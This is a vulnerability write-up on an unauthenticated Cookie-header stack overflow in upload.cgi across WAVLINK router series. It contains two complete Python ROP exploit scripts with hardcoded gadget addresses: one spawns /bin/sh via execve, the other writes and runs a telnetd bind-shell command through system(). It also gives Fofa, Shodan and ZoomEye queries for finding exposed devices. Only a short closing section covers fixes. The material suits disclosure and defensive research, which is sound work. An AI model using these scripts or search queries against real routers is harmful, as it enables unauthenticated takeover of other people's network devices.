# WAVLINK Router Series upload.cgi Unauthenticated RCE — Cross-Series Vulnerability Verified on Two Devices

## Overview

- **Scope**: Multiple WAVLINK router series — cross-series firmware reverse engineering confirms that **10+ series** (WN572, WN570H, WN573, WN529, WN530, WN531, WN535, WN536, WN551, WN557, NU516, etc.) all use the exact same unbounded `strcpy` logic in `upload.cgi`, leaving every single one vulnerable
- **Verification Strategy**: With this many affected series, completing full ROP exploitation for each one individually would be impractical and unnecessary — the root cause (`upload.cgi` unbounded `strcpy`) and exploitation approach (control libc → find gadgets → chain RCE) are identical across all models. Therefore, two representative devices were selected for full verification:
  - **WL-WN572HP3-A** (MT7628, MIPS32 LE) — first verified device, ROP chain writes command + `system()` to spawn telnetd reverse shell
  - **WN570H** (MIPS32 LE) — second independent reproduction, ultra-minimal 4-hop ROP chain with `execve("/bin/sh")`
- **Web Server**: lighttpd (port 80, CGI)
- **Vulnerability Type**: CGI Cookie stack buffer overflow → ROP chain → Remote Code Execution
- **Attack Vector**: Unauthenticated Remote Code Execution (RCE), no login required!

Both devices share the same root cause but employ completely different ROP strategies, fully demonstrating the cross-series nature of this vulnerability — different devices only need gadget adaptation per their respective libc to be exploitable.

---

## Asset Discovery

Using cyberspace search engines to identify internet-exposed vulnerable WAVLINK devices.

### General Search Queries

- **Fofa**: `body="WAVLINK" && body="upload.cgi"`
- **Shodan**: `"WAVLINK" "lighttpd"`
- **ZoomEye**: `app:"WAVLINK Router"`

### Per-Series Fofa Queries

#### WN529 Series

```
response:"WN529" OR header:"WN529" OR title:"WN529" AND (response:"WavLink" OR response:"WAVLINK" OR header:"Server: Wavlink")
```

![1780982729223](EXPLOIT_REPORT_WN570H/1780982729223.png)


#### WN530 Series

```
response:"WN530" OR header:"WN530" OR title:"WN530" AND (response:"WavLink" OR response:"WAVLINK" OR header:"Server: Wavlink")
```

![1780982766747](EXPLOIT_REPORT_WN570H/1780982766747.png)


#### WN531 Series

```
response:"WN531" OR header:"WN531" OR title:"WN531" AND (response:"WavLink" OR response:"WAVLINK" OR header:"Server: Wavlink")
```

![1780982803815](EXPLOIT_REPORT_WN570H/1780982803815.png)


#### WN535 Series

```
response:"WN535" OR header:"WN535" OR title:"WN535" AND (response:"WavLink" OR response:"WAVLINK" OR header:"Server: Wavlink")
```

![1780982831225](EXPLOIT_REPORT_WN570H/1780982831225.png)


#### WN570 Series

```
response:"WN570" OR header:"WN570" OR title:"WN570" AND (response:"WavLink" OR response:"WAVLINK" OR header:"Server: Wavlink")
```

![1780982879509](EXPLOIT_REPORT_WN570H/1780982879509.png)


#### WN572 Series (includes verified WL-WN572HP3-A)

```
response:"WN572" OR header:"WN572" OR title:"WN572" AND (response:"WavLink" OR response:"WAVLINK" OR header:"Server: Wavlink")
```

![1780982909942](EXPLOIT_REPORT_WN570H/1780982909942.png)


#### WN573 Series

```
response:"WN573" OR header:"WN573" OR title:"WN573" AND (response:"WavLink" OR response:"WAVLINK" OR header:"Server: Wavlink")
```

![1780982938913](EXPLOIT_REPORT_WN570H/1780982938913.png)

---

## Cross-Series Reverse Engineering Comparison

Decompilation of `upload.cgi` across all series clearly shows that every model uses `strcpy` to copy `HTTP_COOKIE` directly onto a stack buffer with no length check whatsoever. The code logic is highly consistent across the entire product line.

### WN529 Series

![1780976143284](EXPLOIT_REPORT_WN570H/1780976143284.png)


### WN530 Series

![1780976200472](EXPLOIT_REPORT_WN570H/1780976200472.png)


### WN531 Series

![1780935134474](EXPLOIT_REPORT_WN570H/1780935134474.png)


### WN535 Series

![1780935202255](EXPLOIT_REPORT_WN570H/1780935202255.png)


### WN570H Series

![1780931674838](EXPLOIT_REPORT_WN570H/1780931674838.png)


### WN573 Series

![1780931784925](EXPLOIT_REPORT_WN570H/1780931784925.png)


The decompilation screenshots of these 6 series confirm identical logic — none use `strncpy`/`snprintf` or any safe string functions, allowing direct overflow. Other series (WN536/551/557/NU516, etc.) are not individually shown due to volume, but firmware decompilation confirms the same issue. Below, we select WN570H and WL-WN572HP3-A to demonstrate two complete ROP exploitation approaches.

---

# Device 1: WN570H — Ultra-Minimal 4-Hop execve Shell

### Relevant Files

| File | Purpose |
|------|---------|
| `lighttpd` | Web server, HTTP parsing, CGI forwarding |
| `upload.cgi` | CGI binary, stack overflow vulnerability |
| `libuClibc-0.9.33.2.so` | uClibc, ROP gadget source |

### Cookie Constraints

| Constraint | Explanation |
|------------|-------------|
| No NULL (`0x00`) | C string `strcpy` terminator |
| No LF (`0x0A`) | HTTP header line terminator |
| No CR (`0x0D`) | HTTP header line terminator |

All ROP chain addresses are free of the above illegal bytes.

---

## Vulnerability Analysis

### Vulnerability Point: `upload.cgi`

`upload.cgi` reads the `HTTP_COOKIE` environment variable and copies it via `strcpy` onto a fixed-size stack buffer **without any length check**, causing a stack buffer overflow. An attacker crafts an oversized Cookie value to overwrite the return address (`$ra`) and hijack control flow.

### Binary Protections

- **NX (Non-Executable Stack)**: Enabled — ROP required
- **ASLR**: Disabled — libc base fixed at `0x2AB6A000`, all gadget addresses never change
- **Stack Canary**: None

---

## ROP Chain Design

### Gadget Inventory

| Name | Offset | Absolute Address | Function |
|------|--------|------------------|----------|
| **GADGET** | `0x28BE8` | `0x2AB92BE8` | Stack restore: `lw $s0-$s4, $ra; jr $ra; addiu $sp, +0x30` |
| **MOVE_A1_A2** | `0xC264` | `0x2AB76264` | `move $a1, $a2; lw $ra, 0x84($sp); lw $s0, 0x80($sp); jr $ra; addiu $sp, +0x88` |
| **INADDR** | `0x3EBE4` | `0x2ABA8BE4` | `lw $a0, 0x18($sp); lw $ra, 0x24($sp); jr $ra` |
| **EXECVE** | `0xA8BC` | `0x2AB748BC` | `li $v0, 0xFAB; syscall` |
| **BINSH_STR** | `0x533F8` | `0x2ABBD3F8` | Embedded `"/bin/sh"` string in libc |

### Key Gadget Details

#### ① GADGET — Function Dispatcher

`lw $s0, 0x18($sp); lw $s1, 0x1C($sp); lw $s2, 0x20($sp); lw $s3, 0x24($sp); lw $s4, 0x28($sp); lw $ra, 0x2C($sp); jr $ra; addiu $sp, +0x30`

**Role**: ROP chain entry trampoline. Each invocation loads 6 registers ($s0-$s4, $ra) from the stack and jumps to the next gadget via `jr $ra`. Frame size: 0x30 bytes.

#### ② MOVE_A1_A2 — Zero $a1

`move $a1, $a2; lw $ra, 0x84($sp); lw $s0, 0x80($sp); jr $ra; addiu $sp, +0x88`

**Role**: Exploits the fact that `$a2` happens to be 0 (unset in the calling context). `move $a1, $a2` sets `$a1 = 0`, satisfying `execve`'s `argv = NULL` parameter. Frame size: 0x88 bytes.

#### ③ INADDR — Load $a0

`lw $a0, 0x18($sp); lw $ra, 0x24($sp); jr $ra; addiu $sp, +0x28`

**Role**: Loads `$a0` from the stack with the libc address of `"/bin/sh"`. Frame size: 0x28 bytes.

#### ④ EXECVE — Syscall Execution

`li $v0, 0xFAB; syscall`

**Role**: Directly triggers a MIPS `syscall` instruction with syscall number `0xFAB` (MIPS Linux `execve`).

### ROP Chain

```
main return → GADGET → MOVE_A1_A2 → INADDR → EXECVE
```

| Step | Gadget | Action | $a0 | $a1 | $a2 |
|------|--------|--------|-----|-----|-----|
| 1 | GADGET | Set $ra → MOVE_A1_A2 | — | — | — |
| 2 | MOVE_A1_A2 | $a1 = $a2 = 0, $ra → INADDR | — | 0 | 0 |
| 3 | INADDR | $a0 = "/bin/sh", $ra → EXECVE | BINSH | 0 | 0 |
| 4 | EXECVE | syscall(0xFAB) | BINSH | 0 | 0 |

Ultra-compact: 4 hops to achieve `execve("/bin/sh", NULL, NULL)`.

### Why Direct Syscall Works

The `EXECVE` gadget resides inside libc as part of a legitimate syscall wrapper's normal code path. Jumping directly into `li $v0, 0xFAB; syscall` bypasses PLT/GOT resolution entirely and does not depend on any function call stack frame, making it the most reliable terminal gadget in a pure ROP chain.

---

## WN570H Exploit Script

`exploit_execve_sh.py`:

```python
#!/usr/bin/env python3
"""
upload.cgi ROP exploit — execve("/bin/sh", NULL, NULL)
Usage: python3 exploit_execve_sh.py [target_url]
"""

import struct
import sys
import socket

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8080/cgi-bin/upload.cgi"

LIBC_BASE = 0x2AB6A000

GADGET           = LIBC_BASE + 0x28BE8   # lw s0-s4,ra; jr ra; addiu sp,+0x30
MOVE_A1_A2       = LIBC_BASE + 0xC264    # move $a1,$a2; lw $ra,sp+0x84; lw $s0,sp+0x80; jr ra; addiu sp,+0x88
INADDR           = LIBC_BASE + 0x3EBE4   # lw $a0,sp+0x18; lw $ra,sp+0x24; jr ra; addiu sp,+0x28
EXECVE_SYSCALL   = LIBC_BASE + 0xA8BC    # li $v0,0xFAB; syscall
BINSH_STR        = LIBC_BASE + 0x533F8   # "/bin/sh" in libc

p32 = lambda x: struct.pack("<I", x)


def build_payload():
    p = b""

    # cookie buffer start (sp+0x20)
    p += b"token=AAAAAA"                     # 12 bytes

    # junk padding to saved regs (offset 0x170)
    p += b"B" * (0x170 - 12)                 # 356 bytes

    # main saved regs (offset 0x170)
    p += p32(0x41414141)   # $s0
    p += p32(0x42424242)   # $s1
    p += p32(0x43434343)   # $s2
    p += p32(0x44444444)   # $s3
    p += p32(0x45454545)   # $s4
    p += p32(0x46464646)   # $s5
    p += p32(0x47474747)   # $s6
    p += p32(0x48484848)   # $s7
    p += p32(0x49494949)   # $fp
    p += p32(GADGET)        # $ra ← hijacked!

    # addiu sp,+0x1B8 gap
    p += b"C" * 0x18

    # ─── GADGET frame (0x30) ───
    p += p32(0x51515151)     # $s0
    p += p32(0x52525252)     # $s1
    p += p32(0x53535353)     # $s2
    p += p32(0x54545454)     # $s3
    p += p32(0x55555555)     # $s4
    p += p32(MOVE_A1_A2)     # $ra → MOVE_A1_A2

    # ─── MOVE_A1_A2 frame (0x88) ───
    p += b"Y" * 0x80
    p += p32(0x59595959)
    p += p32(INADDR)          # $ra → INADDR

    # ─── INADDR frame (0x28) ───
    p += b"I" * 0x18
    p += p32(BINSH_STR)       # sp+0x18 → $a0 = "/bin/sh"
    p += p32(0xEEEEEEEE)
    p += p32(0xEEEEEEEE)
    p += p32(EXECVE_SYSCALL)  # sp+0x24 → $ra → syscall

    return p


def send_http_raw(payload):
    url = TARGET
    if url.startswith("http://"): url = url[7:]
    host, _, path = url.partition("/")
    path = "/" + path if path else "/"
    hostname, port = (host.split(":")[0], int(host.split(":")[1])) if ":" in host else (host, 80)

    body = b"dummy=upload"
    request  = b"POST " + path.encode() + b" HTTP/1.1\r\n"
    request += b"Host: " + hostname.encode() + b"\r\n"
    request += b"Cookie: " + payload + b"\r\n"
    request += b"Content-Type: application/x-www-form-urlencoded\r\n"
    request += b"Content-Length: " + str(len(body)).encode() + b"\r\n"
    request += b"Connection: close\r\n\r\n" + body

    print(f"[*] Connecting {hostname}:{port}")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    try:
        sock.connect((hostname, port))
        sock.sendall(request)
        response = b""
        while True:
            try:
                chunk = sock.recv(4096)
                if not chunk: break
                response += chunk
            except socket.timeout: break
        if response:
            print(f"[*] Response ({len(response)} bytes):")
            print(response[:500].decode(errors="replace"))
        else:
            print("[*] No response (CGI crashed or shell spawned)")
    except Exception as e:
        print(f"[!] Connection error: {e}")
    finally:
        sock.close()


def main():
    payload = build_payload()
    null_pos = payload.find(b"\x00")
    safe = "OK" if null_pos == -1 else f"NULL at offset {null_pos}!"

    print(f"[*] Payload size: {len(payload)} bytes")
    print(f"[*] Null check: {safe}")
    print(f"[*] Target: {TARGET}")
    print(f"[*] GADGET:           0x{GADGET:08X}")
    print(f"[*] MOVE_A1_A2:       0x{MOVE_A1_A2:08X}")
    print(f"[*] INADDR:           0x{INADDR:08X}")
    print(f"[*] EXECVE_SYSCALL:   0x{EXECVE_SYSCALL:08X}")
    print(f"[*] &/bin/sh (libc):  0x{BINSH_STR:08X}")
    print()

    if null_pos != -1:
        print(f"[!] Payload contains null byte, aborting!")
        return

    send_http_raw(payload)


if __name__ == "__main__":
    main()
```

---

## WN570H Exploit Demonstration

### QEMU Emulation Launch

```cmd
qemu-system-mipsel -M malta -cpu 24KEc -m 128M -kernel /emux/firmware/WN570H/kernel/vmlinux-3.18.109-malta-le -drive file=/emux/hostfs/hostfs-mipsel.ext2,format=raw -append "root=/dev/sda rw rootwait console=ttyS0,115200 EMUX=firmware/WN570H" -net nic,model=pcnet -net tap,ifname=tap0,script=no,downscript=no -object rng-random,filename=/dev/urandom,id=rng0 -device virtio-rng-pci,rng=rng0 -no-reboot -nographic -serial mon:stdio -monitor tcp:127.0.0.1:55555,server,nowait
```

Emulation successful

![1780932942810](EXPLOIT_REPORT_WN570H/1780932942810.png)


### Debugging

At 0x2AB748BC, before syscall: $a0=BINSH, $a1=0, $a2=0, $v0=0xFAB

![1780931522616](EXPLOIT_REPORT_WN570H/1780931522616.png)

`execve` directly replaces the current CGI process image with a shell process.

Exploit triggered successfully

![1780931605510](EXPLOIT_REPORT_WN570H/1780931605510.png)

---

# Device 2: WL-WN572HP3-A — Chained Store + system() Spawn telnetd

**Note**: This was the first device verified. Unlike WN570H, this device enforces stricter Cookie byte constraints (all bytes ≥ 0x20), and the ROP chain adopts a "write command to BSS + `system()` execution" strategy, demonstrating a different exploitation path for the same vulnerability.

### Relevant Files

| File | Purpose |
|------|---------|
| `lighttpd` | Web server, HTTP parsing, CGI forwarding |
| `ioos` | Internal RPC service, auth/session management |
| `upload.cgi` | CGI binary, stack overflow vulnerability |
| `libc.so` | uClibc, ROP gadget source |

### Cookie Constraint Summary

A full reverse-engineering analysis of `lighttpd` and `ioos` traced the Cookie value path from HTTP request to CGI environment variable.

#### lighttpd Side

The Cookie passes through lighttpd's processing chain:

1. `http_request_parse` parses the HTTP request. **Header values (i.e., Cookie values) undergo no character-level filtering** — only LF (0x0A) and CR (0x0D) are handled as line terminators; all other bytes are passed through as-is.
2. `http_header_request_append` stores the header with no additional filtering.
3. `http_cgi_headers` converts headers to CGI environment variables. NAME undergoes `buffer_copy_string_encoded_cgi_varnames` encoding (e.g., `Cookie` → `HTTP_COOKIE`), but **VALUE is passed to setenv verbatim, with no encoding or filtering**.

#### ioos Side

The ioos component provides further corroboration:

- `sub_4152A0` — A JSON serialization function that checks each byte for `< 0x20` and escapes it as `\u00XX`

![1780745993865](EXPLOIT_REPORT/1780745993865.png)


Summary:

| Constraint          | Source                        | Explanation                                        |
| ------------------- | ----------------------------- | -------------------------------------------------- |
| Bytes ≥ 0x20        | HTTP protocol + ioos `sub_4152A0` | All bytes must be visible ASCII (`0x20`-`0x7E`) |
| No LF (`0x0A`)      | lighttpd `http_request_parse` | LF terminates HTTP header line                     |
| No CR (`0x0D`)      | lighttpd `http_request_parse` | CRLF also terminates header line                   |
| No NULL (`0x00`)    | C string termination          | NULL truncates Cookie value                        |

> **Comparison with WN570H**: The 572HP3 adds a `bytes ≥ 0x20` constraint, meaning all ROP gadget addresses must be composed entirely of visible ASCII-range bytes, restricting available gadgets.

---

## Vulnerability Analysis

### Vulnerability Point: `upload.cgi`

`upload.cgi` suffers from a stack buffer overflow when processing HTTP Cookie headers. An attacker crafts an oversized Cookie value to overwrite the return address (`$ra`) and hijack control flow.

#### Binary Protection Check

NX enabled:

![1780746915824](EXPLOIT_REPORT/1780746915824.png)


libc.so base address is fixed, all ROP gadget addresses never change:

![1780746849583](EXPLOIT_REPORT/1780746849583.png)


Vulnerability point — reading Cookie from environment without length check, leading to stack overflow:

![1780748178116](EXPLOIT_REPORT/1780748178116.png)

---

## ROP Chain Design

### Key Addresses (libc base 0x2AAAB000)

| Symbol | libc Offset | Source |
|--------|-------------|--------|
| `GADGET` | `0x77570` | `pthread_cond_timedwait` |
| `STORE_GADGET` | `0x23088` | `dlinfo` |
| `CLEARENV` | `0x802DC` | `getpid` |
| `SYSTEM` | `0x5A3F8` | `system` |
| `BSS` | — | libc .bss, command write target |
| `ENVIRON` | — | `environ` pointer address |
| `NULL_BSS` | — | Zero-filled BSS, environ redirect target |

### Gadget Details & ROP Role

#### ① GADGET — Function Call Dispatcher

Source: `pthread_cond_timedwait` cancellation cleanup path @ `0x2AB22570`

![1780747613827](EXPLOIT_REPORT/1780747613827.png)

**ROP Role**: The sole "function caller" in the chain. Each iteration calls a target function (`getpid` / `system`) via `$t9`, and after the call returns, `sp += 0x70` advances to the next `GADGET` frame.

#### ② STORE_GADGET — Arbitrary Write Primitive

Source: `dlinfo` function entry @ `0x2AACE088`

![1780747644453](EXPLOIT_REPORT/1780747644453.png)

**ROP Role**: Memory write engine. Uses `sw $s2, 0($s1)` to write 4 bytes to any address per invocation. After execution, the next `$s1` (where to write), `$s2` (what to write), and `$ra` (still STORE_GADGET) are auto-loaded from the current frame, forming a chained loop. 10 writes total (9 command words + 1 environ redirect).

#### ③ CLEARENV (getpid) — Register Initialization

`getpid` function

**ROP Role**: Called via `GADGET`'s `jalr $t9`. While `getpid` itself only returns the PID, its execution sets `$s1`/`$s2` from the current stack frame's saved register area. This gives STORE_GADGET its first write parameters: `s1 = BSS+0`, `s2 = CMD_WORD1`.

#### ④ SYSTEM — Command Execution

`system` function

**ROP Role**: Final step of the ROP chain. Called via `GADGET`'s `jalr $t9` as `system(BSS)`, where BSS already contains `/usr/sbin/telnetd -p999 -l /bin/sh  ` written by the 9 STORE writes. Does not return (internal `execve`).

---

### Command Store Chain

Command: `/usr/sbin/telnetd -p999 -l /bin/sh  ` (36 bytes = 9 words, trailing spaces prevent null)

| Store | Write Address | Value (LE) | String |
|-------|---------------|------------|--------|
| 1 | BSS+0  | `0x7273752F` | `/usr` |
| 2 | BSS+4  | `0x6962732F` | `/sbi` |
| 3 | BSS+8  | `0x65742F6E` | `n/te` |
| 4 | BSS+12 | `0x74656E6C` | `lnet` |
| 5 | BSS+16 | `0x702D2064` | `d -p` |
| 6 | BSS+20 | `0x20393939` | `999 ` |
| 7 | BSS+24 | `0x2F206C2D` | `-l /` |
| 8 | BSS+28 | `0x2F6E6962` | `bin/` |
| 9 | BSS+32 | `0x20206873` | `sh  ` |


### Environ Redirect

`system()` internally calls `posix_spawn("/bin/sh", argv, attrs, envp)`. `envp` comes from the `environ` global variable.

Problem: The GADGET epilogue restores `$s0-$s7/$fp` after `getpid()` returns, overwriting the original environment variable array on stack and setting `environ[0]` to the GP register value `0x2ab552c0` (a non-null pointer), potentially causing `posix_spawn` to dereference a bad pointer.

An extra STORE frame fixes `environ` itself:

```
Store 10: sw NULL_BSS → [ENVIRON]    // environ = &{0, 0, 0...} (empty env)
```

Now `envp → {NULL}`, and `posix_spawn` gets an empty environment without crashing.

### Complete ROP Chain Layout

| Frame # | Offset | Function | sp delta |
|---------|--------|----------|----------|
| — | env_+0x154 | `$ra → GADGET` | — |
| 1 | env_+0x158 | `getpid()` + set s1/s2 | → 0x1C8 |
| Store 1-9 | env_+0x1C8~0x308 | Write 9 words to BSS | → 0x330 |
| Store 10 | env_+0x330 | `sw NULL_BSS → [ENVIRON]` | → 0x358 |
| System | env_+0x358 | `system(BSS)` | (no return) |

---

## QEMU Emulation Launch

```cmd
qemu-system-mipsel -M malta -cpu 24KEc -m 128M -kernel /emux/firmware/WN572HP3-A/kernel/vmlinux-3.18.109-malta-le -drive file=/emux/hostfs/hostfs-mipsel.ext2,format=raw -append "root=/dev/sda rw rootwait console=ttyS0,115200 EMUX=firmware/WN572HP3-A" -net nic,model=pcnet -net tap,ifname=tap0,script=no,downscript=no -object rng-random,filename=/dev/urandom,id=rng0 -device virtio-rng-pci,rng=rng0 -no-reboot -nographic -serial mon:stdio -monitor tcp:127.0.0.1:55555,server,nowait
```

---

## WL-WN572HP3-A Exploit Script

`send_payload_v2.py`:

```python
import socket
import struct

TARGET = '127.0.0.1'
PORT = 20080

# ---- Addresses (libc base 0x2AAAB000) ----
GADGET       = 0x2AB22570  # libc + 0x77570  (pthread_cond_timedwait epilogue)
CLEARENV     = 0x2AB2B2DC  # libc + 0x802DC  (getpid — harmless, no side effects)
SYSTEM       = 0x2AB053F8  # libc + 0x5A3F8   (system)
STORE_GADGET = 0x2AACE088  # libc + 0x23088  (sw $s2, 0($s1); reload s1/s2/ra; sp+=0x28)
BSS          = 0x2AB4E070  # libc + 0xA3070  (libc .bss deep, writable, zero-guaranteed)
ENVIRON      = 0x2AB4E6F0  # libc + 0xA36F0  (&environ pointer in BSS)
NULL_BSS     = 0x2AB4E0A0  # libc + 0xA30A0  (BSS area confirmed all zeros)

# ---- Command (36 bytes = 9 stores, no nulls, all bytes >= 0x20) ----
# "/usr/sbin/telnetd -p999 -l /bin/sh  " → reverse shell on port 999
CMD_WORD1 = 0x7273752F  # "/usr" (2F 75 73 72)
CMD_WORD2 = 0x6962732F  # "/sbi" (2F 73 62 69)
CMD_WORD3 = 0x65742F6E  # "n/te" (6E 2F 74 65)
CMD_WORD4 = 0x74656E6C  # "lnet" (6C 6E 65 74)
CMD_WORD5 = 0x702D2064  # "d -p" (64 20 2D 70)
CMD_WORD6 = 0x20393939  # "999 " (39 39 39 20)
CMD_WORD7 = 0x2F206C2D  # "-l /" (2D 6C 20 2F)
CMD_WORD8 = 0x2F6E6962  # "bin/" (62 69 6E 2F)
CMD_WORD9 = 0x20206873  # "sh  " (73 68 20 20)

# ---- Payload Layout ----
# Chain: getpid → Store1..Store9 → Store10(environ fix) → system()

p  = b''
p += b'token='
p += b'A' * 334
p += struct.pack('<I', GADGET)
p += b'A' * 36

# ========== Frame 1: getpid() ==========
p += struct.pack('<I', CLEARENV)
p += b'A' * 8
p += b'A' * 4
p += b'A' * 20
p += b'AAAA'
p += struct.pack('<I', BSS + 0)
p += struct.pack('<I', CMD_WORD1)
p += b'AAAA' * 5
p += b'AAAA'
p += struct.pack('<I', STORE_GADGET)

# ========== Store 1: "/usr" → BSS+0 ==========
p += b'A' * 24
p += b'AAAA'
p += struct.pack('<I', BSS + 4)
p += struct.pack('<I', CMD_WORD2)
p += struct.pack('<I', STORE_GADGET)

# ========== Store 2: "/sbi" → BSS+4 ==========
p += b'A' * 24
p += b'AAAA'
p += struct.pack('<I', BSS + 8)
p += struct.pack('<I', CMD_WORD3)
p += struct.pack('<I', STORE_GADGET)

# ========== Store 3: "n/te" → BSS+8 ==========
p += b'A' * 24
p += b'AAAA'
p += struct.pack('<I', BSS + 12)
p += struct.pack('<I', CMD_WORD4)
p += struct.pack('<I', STORE_GADGET)

# ========== Store 4: "lnet" → BSS+12 ==========
p += b'A' * 24
p += b'AAAA'
p += struct.pack('<I', BSS + 16)
p += struct.pack('<I', CMD_WORD5)
p += struct.pack('<I', STORE_GADGET)

# ========== Store 5: "d -p" → BSS+16 ==========
p += b'A' * 24
p += b'AAAA'
p += struct.pack('<I', BSS + 20)
p += struct.pack('<I', CMD_WORD6)
p += struct.pack('<I', STORE_GADGET)

# ========== Store 6: "999 " → BSS+20 ==========
p += b'A' * 24
p += b'AAAA'
p += struct.pack('<I', BSS + 24)
p += struct.pack('<I', CMD_WORD7)
p += struct.pack('<I', STORE_GADGET)

# ========== Store 7: "-l /" → BSS+24 ==========
p += b'A' * 24
p += b'AAAA'
p += struct.pack('<I', BSS + 28)
p += struct.pack('<I', CMD_WORD8)
p += struct.pack('<I', STORE_GADGET)

# ========== Store 8: "bin/" → BSS+28 ==========
p += b'A' * 24
p += b'AAAA'
p += struct.pack('<I', BSS + 32)
p += struct.pack('<I', CMD_WORD9)
p += struct.pack('<I', STORE_GADGET)

# ========== Store 9: "sh  " → BSS+32 ==========
p += b'A' * 24
p += b'AAAA'
p += struct.pack('<I', ENVIRON)
p += struct.pack('<I', NULL_BSS)
p += struct.pack('<I', STORE_GADGET)

# ========== Store 10: environ redirect ==========
p += b'A' * 24
p += b'AAAA' * 3
p += struct.pack('<I', GADGET)

# ========== System Frame: system(BSS) ==========
p += b'A' * 36
p += struct.pack('<I', SYSTEM)
p += b'A' * 8
p += struct.pack('<I', BSS)
p += b'A' * 20
p += b'AAAA' * 9

# ---- Verify ----
BAD = False
for off, b in enumerate(p):
    if b < 0x20:
        print(f'[!] BAD BYTE 0x{b:02X} at offset {off} (0x{off:X})')
        BAD = True
if not BAD:
    print('[+] All bytes pass HTTP header value validation (>= 0x20)!')

print(f'[*] Payload size: {len(p)} bytes')
print(f'[*] GADGET   = 0x{GADGET:08X}')
print(f'[*] SYSTEM   = 0x{SYSTEM:08X}')
print(f'[*] STORE    = 0x{STORE_GADGET:08X}')
print(f'[*] BSS      = 0x{BSS:08X}')
print(f'[*] CMD: /usr/sbin/telnetd -p999 -l /bin/sh')

# ---- Send ----
request = (
    b'GET /cgi-bin/upload.cgi HTTP/1.1\r\n'
    b'Host: 127.0.0.1\r\n'
    b'Cookie: ' + p + b'\r\n'
    b'Connection: close\r\n'
    b'\r\n'
)

print(f'[*] Sending {len(request)} bytes...')

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.settimeout(5)
try:
    sock.connect((TARGET, PORT))
    sock.sendall(request)
    resp = sock.recv(4096)
    status_line = resp.split(b'\r\n')[0].decode(errors='replace')
    print(f'[*] Status: {status_line}')
except Exception as e:
    print(f'[-] Error: {e}')
finally:
    sock.close()

import time
time.sleep(1)
print('[*] Trying telnet 127.0.0.1:9999...')
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(3)
    s.connect(('127.0.0.1', 9999))
    s.sendall(b'id\n')
    resp = s.recv(1024)
    print(f'[+] SHELL: {resp.decode(errors="replace")}')
    s.close()
except Exception as e:
    print(f'[-] Shell check: {e}')
```

---

## WL-WN572HP3-A Exploit Demonstration

First, launch firmware in emulator

![1780748697255](EXPLOIT_REPORT/1780748697255.png)


Inside the firmware shell, no telnetd process is running

![1780748722833](EXPLOIT_REPORT/1780748722833.png)


Run the exploit script

![1780748867446](EXPLOIT_REPORT/1780748867446.png)


A telnetd process now appears — exploit successful

![1780748885752](EXPLOIT_REPORT/1780748885752.png)


Reverse shell established successfully

---

## Device Comparison

| Item | WN570H | WL-WN572HP3-A |
|------|--------|---------------|
| **libc base** | `0x2AB6A000` | `0x2AAAB000` |
| **Cookie constraints** | No NULL/LF/CR | No NULL/LF/CR, plus all bytes ≥ 0x20 |
| **ROP strategy** | Ultra-minimal 4-hop `execve("/bin/sh")` | Chained STORE writes + `system()` spawns telnetd |
| **Payload size** | ~356 bytes | ~966 bytes |
| **Exploit effect** | CGI process replaced by shell | Background telnetd (port 999), connect for shell |

Both devices share the same root cause (`upload.cgi` unbounded `strcpy`), yet their ROP chains differ radically due to subtle variations in libc version and Cookie delivery path. This perfectly illustrates the cross-series nature of the vulnerability — the bug is identical, the exploitation approach is identical (control libc → find gadgets → chain RCE), only the gadget adaptation needs adjustment per device environment. The remaining series (WN529/530/531/535/536/551/557/NU516, etc.) only require libc offset-specific gadget adaptation to reproduce.

---

## Fix Recommendations

Given that multiple WAVLINK firmware series share **the same unbounded copy issue** in `upload.cgi`, the vendor is advised to apply a unified fix across the entire product line:

1. **Limit Cookie length**: Replace unbounded `strcpy` with `strncpy`/`snprintf` in all `upload.cgi` binaries, enforcing a reasonable maximum Cookie length
2. **Enable stack protection**: Compile all series with `-fstack-protector-all`
3. **Enable ASLR**: Currently `randomize_va_space = 0`; should be set to `2` to randomize libc base address
